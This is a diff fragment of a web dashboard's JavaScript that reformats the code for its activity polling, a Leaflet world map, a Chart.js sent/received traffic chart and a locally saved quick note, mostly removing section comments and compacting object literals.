   try {
     const res = await fetch('/api/activity');
@@ -1203,19 +905,11 @@ async function updateActivity() {
 setInterval(updateActivity, 5000);
 updateActivity();
 
-/* ============ MAP ============ */
 let worldMap = null;
 function initMap() {
   if (typeof L === 'undefined') return;
-  worldMap = L.map('worldMap', {
-    zoomControl: false,
-    attributionControl: false
-  }).setView([30, 20], 2);
-
-  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-    maxZoom: 19
-  }).addTo(worldMap);
-
+  worldMap = L.map('worldMap', { zoomControl: false, attributionControl: false }).setView([30, 20], 2);
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom: 19 }).addTo(worldMap);
   L.control.zoom({ position: 'topright' }).addTo(worldMap);
 }
 
@@ -1230,7 +924,6 @@ function addLocationToMap(lat, lon, id) {
   worldMap.setView([lat, lon], 5);
 }
 
-/* ============ TRAFFIC CHART ============ */
 let trafficChart = null;
 function initChart() {
   if (typeof Chart === 'undefined') return;
@@ -1240,24 +933,8 @@ function initChart() {
     data: {
       labels: [],
       datasets: [
-        {
-          label: 'Recv',
-          data: [],
-          borderColor: '#0099ff',
-          backgroundColor: 'rgba(0,153,255,0.1)',
-          tension: 0.4,
-          fill: true,
-          pointRadius: 0
-        },
-        {
-          label: 'Sent',
-          data: [],
-          borderColor: '#ff0033',
-          backgroundColor: 'rgba(255,0,51,0.1)',
-          tension: 0.4,
-          fill: true,
-          pointRadius: 0
-        }
+        { label: 'Recv', data: [], borderColor: '#0099ff', backgroundColor: 'rgba(0,153,255,0.1)', tension: 0.4, fill: true, pointRadius: 0 },
+        { label: 'Sent', data: [], borderColor: '#ff0033', backgroundColor: 'rgba(255,0,51,0.1)', tension: 0.4, fill: true, pointRadius: 0 }
       ]
     },
     options: {
@@ -1266,11 +943,7 @@ function initChart() {
       plugins: { legend: { display: false } },
       scales: {
         x: { display: false },
-        y: {
-          beginAtZero: true,
-          grid: { color: 'rgba(255,255,255,0.05)' },
-          ticks: { color: '#7a7e8a', font: { size: 10 } }
-        }
+        y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: '#7a7e8a', font: { size: 10 } } }
       }
     }
   });
@@ -1294,16 +967,12 @@ async function updateChart() {
   } catch(e) {}
 }
 
-/* ============ QUICK NOTE ============ */
 const noteBox = document.getElementById('quickNote');
 if (noteBox) {
   noteBox.value = localStorage.getItem('pris_note') || 'Stay secure. Use only for educational purposes.';
-  noteBox.addEventListener('input', () => {
-    localStorage.setItem('pris_note', noteBox.value);
-  });
+  noteBox.addEventListener('input', () => localStorage.setItem('pris_note', noteBox.value));
 }
 
-/* ============ INIT ============ */
 window.addEventListener('load', () => {
   initMap();
   initChart();
